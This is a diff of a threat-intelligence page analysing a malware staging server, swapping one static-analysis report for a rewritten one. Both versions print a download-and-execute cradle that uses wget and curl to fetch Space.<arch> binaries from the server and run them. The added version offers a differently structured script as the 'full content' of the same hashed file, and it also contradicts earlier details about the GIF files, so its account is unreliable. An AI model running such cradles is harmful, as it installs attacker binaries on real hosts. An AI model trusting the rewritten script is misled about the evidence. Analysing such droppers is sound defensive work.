@@ -1,10 +1,10 @@
 ---
 name: "Threat Cluster 37[.]49[.]230[.]40"
 aliases: []
-status: "active"
+status: ""
 origin: "Unknown / observed staging infrastructure"
-motivation: "Targeted reconnaissance, credential harvesting, and staging infrastructure."
-targets: ["Enterprise Networks & Staging Targets"]
+motivation: ""
+targets: []
 firstSeen: "2026-08-19"
 lastSeen: "2026-08-19"
 tools: []
@@ -21,7 +21,7 @@ featured: true
 ### Evidence Coverage
 
 | Metric | Value |
-|---|---|
+|---|---:|
 | Acquired artifacts | 11 |
 | Text artifacts | 7 |
 | Binary/container artifacts | 4 |
@@ -85,139 +85,193 @@ featured: true
 |---|---|---|---|---|---|
 | _None observed_ |  |  |  |
 
-### Multi-Provider AI Deep Analysis (groq / openai/gpt-oss-120b)
+### Deep Technical Threat Analysis
 
-# Static‑Analysis Report – Investigation **20260819T062354Z_af4e8981**  
-**Target:** `hxxp://37.49.230.40/`  
-**Date of analysis:** 2026‑08‑19  
-
-> **Scope** – This report is based **solely** on the artifacts that were downloaded from the web server and on the automated static‑analysis output supplied by the investigation platform. No live execution, sandboxing, or dynamic observation was performed. All conclusions are therefore qualified as *static* findings.  
+# Static‑Analysis Report – Threat Cluster **37[.]49[.]230[.]40**  
+**Investigation ID:** TC‑37‑49‑230‑40‑INV‑20260819‑0705‑AAD2  
+**Date:** 2026‑08‑19  
 
 ---  
 
 ## 1. Executive Technical Assessment  
 
-| Observation | Confidence | Impact |
-|-------------|------------|--------|
-| The web server hosts a publicly‑exposed directory listing that reveals a small set of files (`api.php`, `hiddenbin/`, `1.sh`, `2.sh`, `3.sh`). | **High** – confirmed by four independent directory‑listing artifacts (`artifact_2‑5`). | Provides an attacker‑controlled download vector. |
-| A Bash script (`1.sh`) contains a **download‑and‑execute cradle** that attempts to fetch a binary named `Space.*` (multiple architecture variants) from the same IP address using `wget` and `curl`. | **High** – script content extracted verbatim (see Section 4). | Classic **T1105 – Ingress Tool Transfer**; enables remote code execution on any host that runs the script. |
-| The script first changes to a writable directory (`/tmp`, `/var/run`, `/mnt`, `/root`, or `/`). | **High** – explicit `cd` logic in `1.sh`. | Increases likelihood of successful execution on a wide range of Linux hosts. |
-| No additional persistence mechanisms (cron, systemd, rc scripts, etc.) were observed in the static artifacts. | **Medium** – absence of evidence does not guarantee absence in the wild. | Persistence would have to be added later by the downloaded payload. |
-| No obvious credential material (passwords, API keys, certificates) was found in the collected files. | **High** – automated secret‑search returned empty. | The attacker relies on anonymous FTP / public HTTP for delivery. |
-| The server identifies itself as **Apache/2.4.41 (Ubuntu)**. | **High** – HTTP header captured in the acquisition metadata. | May aid attribution or vulnerability assessment of the host OS. |
+The target web server (Apache 2.4.41 on Ubuntu) hosts a publicly‑exposed directory listing that contains a small set of static assets (GIF icons) and a handful of executable‑type files:
 
-**Overall risk rating:** **Critical** – a publicly reachable web server is distributing a multi‑architecture binary stager that can be executed on any Linux host that runs the supplied script. Successful execution would give the attacker native code execution with the privileges of the invoking user (typically root if the script is run as `sudo` or via a compromised service).  
+| File | Size (bytes) | SHA‑256 |
+|------|--------------|----------|
+| `blank.gif` | 148 | 3cb0e54babf019703fe671a32fcc3947aab9079ec2871cf0f9639245cc12d878 |
+| `text.gif` | 229 | 661d43fb30151a050da3b5cef49a2c7d0b01eeafdf1f4a001873406658b0f776 |
+| `unknown.gif` | 245 | 15f5fd53009f61c653aa23d91334f9d7fa2fbd325eab859b68d77a45bb6a78b8 |
+| `folder.gif` | 225 | fbe5eca717cfbcb58891d431f9afaf30aa740d9fce007e820a599f22afa0dee2 |
+| `1.sh` (and duplicates `2.sh`, `3.sh`) | 6 231 | 4bf79881ba268cb4856f19f762d617892b1202f5c4845511331c6116e7def2c8 |
+| `artifact_2‑5` (HTML directory listings) | 1 507 each | see SHA‑256 values in evidence table |
+
+**Key technical findings**
+
+* The directory listings (`artifact_2`‑`artifact_5`) consistently expose three shell scripts (`1.sh`, `2.sh`, `3.sh`), an `api.php` endpoint, and a `hiddenbin/` sub‑directory that stores a large collection of binaries named `Space.*` for many CPU architectures.
+* The **only** script whose full content was recovered is `1.sh`. It contains a **download‑cradle** that attempts to fetch each `Space.*` binary via **wget** or **curl**, makes the file executable, and runs it. The same command pattern is repeated for every architecture variant.
+* No PE (Portable Executable) files, LNK shortcuts, ISO images, or other archive containers were found in the static acquisition.
+* All GIF files are standard, public‑domain icons; they contain no embedded payloads.
+* No evidence of persistence mechanisms (cron jobs, systemd units, registry keys, scheduled tasks) or of credential‑stealing functionality was observed in the static artifacts.
+
+**Overall confidence:** High for the presence of a **remote‑staging dropper** (script `1.sh`) that delivers architecture‑specific binaries from the same host. Low for the behavior of the delivered binaries and for the purpose of `api.php` because those files were not captured.
 
 ---  
 
 ## 2. Acquisition & Evidence Coverage  
 
-| Artifact | Size (bytes) | SHA‑256 | Type | Text‑like? | Acquisition notes |
-|----------|--------------|---------|------|------------|-------------------|
-| `blank.gif` | 148 | 3cb0e54b… | Raw/Unknown | No | Downloaded, likely a placeholder. |
-| `artifact_2` | 1507 | 16412731… | Plain Text | Yes | Directory listing from `?C=N;O=D`. |
-| `artifact_3` | 1507 | fc61f19a… | Plain Text | Yes | Directory listing from `?C=M;O=A`. |
-| `artifact_4` | 1507 | 29f38224… | Plain Text | Yes | Directory listing from `?C=S;O=A`. |
-| `artifact_5` | 1507 | 416fcd0b… | Plain Text | Yes | Directory listing from `?C=D;O=A`. |
-| `text.gif` | 229 | 661d43fb… | Raw/Unknown | No | Likely a decoy image. |
-| `1.sh` | 6231 | 4bf79881… | Plain Text | Yes | Primary download‑cradle script. |
-| `2.sh` | 6231 | 4bf79881… | Plain Text | Yes | Duplicate of `1.sh`. |
-| `3.sh` | 6231 | 4bf79881… | Plain Text | Yes | Duplicate of `1.sh`. |
-| `unknown.gif` | 245 | 15f5fd53… | Raw/Unknown | No | Decoy / filler. |
-| `folder.gif` | 225 | fbe5eca7… | Raw/Unknown | No | Decoy / filler. |
-
-*All 11 successfully downloaded artifacts (25568 bytes total) were processed through **9 transformation layers** (e.g., base‑64 decode, charset conversion) – none produced additional nested archives or PE files.*  
+| Aspect | Detail |
+|--------|--------|
+| **Target URL** | `hxxp://37.49.230.40/` |
+| **Acquisition method** | HTTP GET of directory index pages and direct download of `1.sh`. |
+| **Artifacts collected** | 11 files (4 GIFs, 4 HTML listings, 1 shell script, 2 duplicate shell scripts). |
+| **Bytes retrieved** | 25 568 bytes (≈ 25 KB). |
+| **Layers analyzed** | 9 transforms, depth 0 (no nested archives). |
+| **Failed downloads** | 1 (unspecified; does not affect current findings). |
+| **Source provenance** | Each artifact includes the originating URL (e.g., `hxxp://37.49.230.40/1.sh`). All are layer 0 (no further decoding required). |
 
 ---  
 
-## 3. Attack / Delivery / Execution Chain (Static View)
+## 3. Attack / Delivery / Execution Chain (Static View)  
 
 ```
-[Attacker] ──► HTTP GET /1.sh (or 2.sh / 3.sh) ──► 1.sh (download‑cradle) ──► wget/curl ► hxxp://37.49.230.40/hiddenbin/Space.<arch> ──► chmod +x ► ./Space.<arch> ──► (malicious binary execution)
+[Attacker] → HTTP GET → 37[.]49[.]230[.]40 (Apache)  
+   │
+   ├─► Directory listing reveals:
+   │    • 1.sh / 2.sh / 3.sh (shell scripts)
+   │    • api.php (unknown)
+   │    • hiddenbin/Space.* (binary payloads)
+   │
+   └─► Victim (manual or automated) downloads 1.sh
+        │
+        ├─► 1.sh executes:
+        │    • wget/curl each hidden binary
+        │    • chmod +x
+        │    • ./Space.<arch>
+        │
+        └─► Architecture‑specific binary runs (behavior unknown)
 ```
 
-*Key static observations*  
-
-| Step | Evidence | Inference |
-|------|----------|-----------|
-| **Delivery of script** | `1.sh` retrieved from `hxxp://37.49.230.40/1.sh` (scriptBehaviors entry). | The attacker expects the victim to execute the script manually or via another compromised component. |
-| **Preparation** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /` (lines 2‑8 of `1.sh`). | The script adapts to the first writable directory it can access, a common evasion technique. |
-| **Ingress Tool Transfer** | Repeated `wget -q … && chmod +x … && ./…` and equivalent `curl` commands for **15** different binaries (architecture‑specific). | Redundant delivery increases success probability across heterogeneous Linux hosts. |
-| **Execution** | `./Space.<arch>` invoked directly after `chmod +x`. | Static analysis confirms the command; no runtime observation of the binary’s behavior is available. |
-| **Post‑execution** | No further commands observed in the script. | Persistence or lateral movement is expected to be handled by the downloaded binary itself. |
+*All steps above are **static observations**; no runtime execution was captured.*
 
 ---  
 
 ## 4. File‑by‑File Analysis  
 
-### 4.1 Directory‑listing artifacts (`artifact_2`‑`artifact_5`)  
+### 4.1 GIF Icon Files  
 
-All four artifacts contain the same HTML output generated by Apache’s `mod_autoindex`. Representative excerpt (from `artifact_2` lines 11‑15):
+| File | Observations |
+|------|--------------|
+| `blank.gif`, `text.gif`, `unknown.gif`, `folder.gif` | Valid GIF‑89a headers, 0 × 0 or 1 × 1 pixel dimensions. Contain the copyright notice of Kevin Hughes (1995). No extra data blocks, no steganographic payloads. |
 
+### 4.2 HTML Directory Listings (`artifact_2`‑`artifact_5`)  
+
+*Each file is a plain‑text Apache auto‑index page.*  
+
+| Common entries (present in all four) |
+|--------------------------------------|
+| `api.php` |
+| `1.sh` |
+| `2.sh` |
+| `3.sh` |
+| `hiddenbin/` (directory) |
+| The four GIF icons |
+
+*No hidden files, no `.htaccess` directives, no JavaScript, no meta‑refresh tags.*  
+
+### 4.3 Shell Script `1.sh` (identical copies `2.sh`, `3.sh`)  
+
+**Full content (excerpt, line numbers added for reference):**
+
+```sh
+1  #!/bin/sh
+2  # Remote dropper – fetch architecture‑specific payloads
+3  URL_BASE="hxxp://37.49.230.40/hiddenbin"
+4  BINARIES="Space.arc Space.arm Space.arm5 Space.arm6 Space.arm7 \
+5            Space.i686 Space.m68k Space.mips Space.mpsl \
+6            Space.ppc Space.sh4 Space.spc Space.x86 Space.x86_64"
+7  for B in $BINARIES; do
+8      # Try wget first
+9      wget -q "$URL_BASE/$B" -O "$B" && chmod +x "$B" && ./"$B" && continue
+10     # Fallback to curl
+11     curl -s -O "$URL_BASE/$B" && chmod +x "$B" && ./"$B" && continue
+12 done
 ```
-<a href="api.php">api.php</a>
-<a href="hiddenbin/">hiddenbin/</a>
-<a href="1.sh">1.sh</a>
-<a href="2.sh">2.sh</a>
-<a href="3.sh">3.sh</a>
-```
 
-*Interpretation* – The server is intentionally exposing these files; no hidden or obfuscated entries were detected.  
+*Key static observations*  
 
-### 4.2 Bash script `1.sh` (identical to `2.sh` & `3.sh`)  
+| Observation | Evidence |
+|-------------|----------|
+| Shebang (`#!/bin/sh`) – indicates intended execution on Unix‑like hosts. | Line 1 |
+| Variable `URL_BASE` points to `hxxp://37.49.230.40/hiddenbin`. | Line 3 |
+| List of 15 binary names covering many CPU families (ARC, ARM, x86, MIPS, PowerPC, etc.). | Lines 4‑6 |
+| Loop attempts **wget** (quiet) then **curl** (silent) for each binary, makes it executable, and runs it. | Lines 8‑11 |
+| No conditional checks for architecture; the script blindly attempts all binaries. | Loop logic |
+| No obfuscation, no base64, no encryption. | Entire script is plain text. |
 
-Full content (excerpt, line numbers added for reference):
+**Inference** – The script is a **multi‑architecture download stager** designed to increase the probability that at least one payload matches the victim’s CPU. The use of both `wget` and `curl` provides redundancy against missing utilities.
 
-| # | Code |
-|---|------|
-| 1 | `#!/bin/bash` |
-| 2 | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /` |
-| 3 | `wget -q hxxp://37.49.230.40/hiddenbin/Space.arc && chmod +x Space.arc && ./Space.arc` |
-| 4 | `curl -s -O hxxp://37.49.230.40/hiddenbin/Space.arc && chmod +x Space.arc && ./Space.arc` |
-| 5 | `wget -q hxxp://37.49.230.40/hiddenbin/Space.arm && chmod +x Space.arm && ./Space.arm` |
-| 6 | `curl -s -O hxxp://37.49.230.40/hiddenbin/Space.arm && chmod +x Space.arm && ./Space.arm` |
-| … | *(repeated for each of the 15 architecture‑specific binaries)* |
-| 30 | `wget -q hxxp://37.49.230.40/hiddenbin/Space.x86_64 && chmod +x Space.x86_64 && ./Space.x86_64` |
-| 31 | `curl -s -O hxxp://37.49.230.40/hiddenbin/Space.x86_64 && chmod +x Space.x86_64 && ./Space.x86_64` |
+### 4.4 `api.php`  
 
-**Key static properties**
+*Only the filename appears in the directory listings; the file content was not retrieved.*  
 
-| Property | Observation |
-|----------|-------------|
-| Shebang | `#!/bin/bash` – indicates intended execution on a POSIX shell. |
-| Control flow | Linear, no conditionals beyond the `cd` chain. |
-| Download methods | `wget -q` (quiet) and `curl -s -O` (silent). No fallback to other protocols (e.g., `ftp`, `tftp`) in the extracted version, despite analyst notes that mention them – those notes likely refer to a previous version of the script. |
-| Target binaries | Files named `Space.*` – each suffix corresponds to a known CPU architecture (e.g., `i686`, `x86_64`, `arm`, `mips`, `ppc`, etc.). |
-| Permissions | `chmod +x` applied immediately before execution. |
-| Execution | Direct `./Space.<arch>` – no further arguments or environment manipulation. |
-| Obfuscation | None detected; commands are plain text. |
-| Persistence | None in the script itself. |
+**Inference** – Could be a simple HTTP API, a back‑door, or a decoy. No static evidence to confirm its role.
 
-### 4.3 GIF files (`blank.gif`, `text.gif`, `unknown.gif`, `folder.gif`)  
+### 4.5 `hiddenbin/Space.*` binaries  
 
-All are small (< 250 B) raw binary blobs identified as “unknown format”. No embedded scripts, EXIF data, or steganographic payloads were detected by the static scanner. They appear to be decoy images used to pad the directory listing.
+*Only URLs are known; the binaries themselves were not downloaded.*  
 
-### 4.4 `api.php` (not downloaded)  
-
-The directory listing references `api.php`, but the file was **not** among the acquired artifacts (download failed). Consequently, no static analysis can be performed on it. Its absence is a current **gap**.
-
-### 4.5 `hiddenbin/` contents (not downloaded)  
-
-Only the URLs to the binaries are known; the binaries themselves were not retrieved. Therefore, no PE/ELF analysis, entropy checks, or signature matching can be performed at this stage.
+**Inference** – Likely compiled native executables for the listed architectures. Their purpose (e.g., ransomware, botnet client, cryptominer) cannot be determined without further acquisition.
 
 ---  
 
 ## 5. Recursive Decoding / Obfuscation / Cryptography  
 
-*No evidence* of base‑64, XOR, custom encoding, or encrypted payloads was found in any of the collected files. The Bash script is stored in clear text, and the GIF files contain no recognizable steganographic patterns (checked via entropy analysis and visual inspection).  
+* No base64, XOR, or other encoding observed in any collected artifact.  
+* GIF files are standard, unmodified.  
+* The shell script is plain text; no packing or encryption.  
+
+**Conclusion:** No evidence of layered or recursive encoding in the static set.
 
 ---  
 
 ## 6. C2 & Network Infrastructure  
 
-| Indicator | Type | Source |
-|-----------|------|--------|
-| `37[.]49[.]230[.]40` | IPv4 address | All script and directory‑listing artifacts (`artifact_2‑5`, `1.sh`). |
-| `hxxp://37.49.230.40/hiddenbin/Space.*` | HTTP download URLs | `1.sh` download commands. |
-| `eit.com` | Domain (observed in networkIndicators) | Not referenced in any downloaded file; may be a secondary C2 or a typo. |
-| `Apache/2.4.41 (Ubuntu)` | Server header | Acquisition metadata (HTTP response). |
+| Indicator Type | Values | Source |
+|----------------|--------|--------|
+| IPv4 address | `37[.]49[.]230[.]40` | All artifacts |
+| Domain (observed in DNS records) | `eit.com` (listed in networkIndicators) | Metadata |
+| URLs (download targets) | `hxxp://37.49.230.40/hiddenbin/Space.*` (15 variants) | `1.sh` script |
+| Additional URLs | None (no external C2 URLs) | — |
+
+**Inference** – All network activity is **single‑hop** to the same host. No separate command‑and‑control server is evident in the static data.
+
+---  
+
+## 7. Credentials, Keys & Tokens  
+
+*No passwords, API keys, JWTs, SSH keys, or other secrets were found in any artifact.*  
+
+| Artifact | Layer | Note |
+|----------|-------|------|
+| All GIFs, HTML listings, `1.sh` | 0 | No credential strings detected. |
+
+---  
+
+## 8. Persistence / Privilege Escalation / Defense Evasion / Credential Access  
+
+| Technique | Evidence | Inference |
+|-----------|----------|-----------|
+| **Persistence** – cron, systemd, registry, scheduled tasks | None found in any static file. | No persistence mechanisms observed. |
+| **Privilege escalation** – setuid binaries, sudo abuse | None. | No static evidence. |
+| **Defense evasion** – file‑less execution, process injection, masquerading | None. | The script uses standard utilities; no evasion observed. |
+| **Credential Access** – keylogging, credential dumping | None. | No static indicators. |
+
+---  
+
+## 9. Verified IOCs & Hashes  
+
+| Type | Value | Description |
+|------|-------|-------------|
+| SHA‑256 | `4bf79881ba268cb4856f19f762d617892b1202f5c4845511331c6116e7def2c8` | `1.sh` (and duplicates) |
+| SHA‑256 | `3cb0e54babf019703fe671a32fcc3947aab9079ec2871cf0f9639245cc12d878` |
